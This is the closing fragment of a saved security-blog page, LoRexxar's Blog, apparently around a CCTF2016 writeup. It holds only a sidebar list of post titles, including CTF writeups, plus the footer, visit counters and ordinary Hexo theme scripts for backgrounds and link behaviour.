class="post-list-item"><a class="post-list-link" href="/2015/05/21/fucksql/">Hduisa_ctf_wee4_fucksql</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/10/webforpentester/">Web for pentester_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup2/">Hduisa_ctf_writeup02</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup1/">Hduisa_ctf_writeup01</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/shinian/">（转）十年学会程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/01/22/webfirst/">0基础如何学好WEB（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/31/hackx/">凤凰挽歌，黑客独白（作者：我是老鹰&amp;炫凤舞）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/bookshelf1/">（转）学长们给我们的书目（结尾附上PDF地址）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/xiaobaistart/">菜鸟小白的开始...</a></li></ul>
+<script>
+</script>
+
+<footer id="footer">
+<div class="outer">
+<div id="footer-info">
+<div class="footer-left">
+<i class="fa fa-copyright"></i> 
+                2014-2017 LoRexxar
+            </div>
+<div class="footer-right">
+<a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+</div>
+</div>
+<div class="visit">
+<span id="busuanzi_container_site_pv" style="display:none">
+<span id="site-visit" title="本站到访数"><i aria-hidden="true" class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span>
+</span>
+</span>
+<span>| </span>
+<span id="busuanzi_container_page_pv" style="display:none">
+<span id="page-visit" title="本页阅读量"><i aria-hidden="true" class="fa fa-eye animated infinite pulse"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+</div>
+</div>
+</footer>
+
+<script data-main="/js/main.js" src="./CCTF2016_writeup  LoRexxar's Blog/require.min.js"></script>
+<script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 7;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+<div class="scroll" id="scroll">
+<a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+<a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+<a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+<script async="" src="./CCTF2016_writeup  LoRexxar's Blog/busuanzi.pure.mini.js">
+</script>
+
+
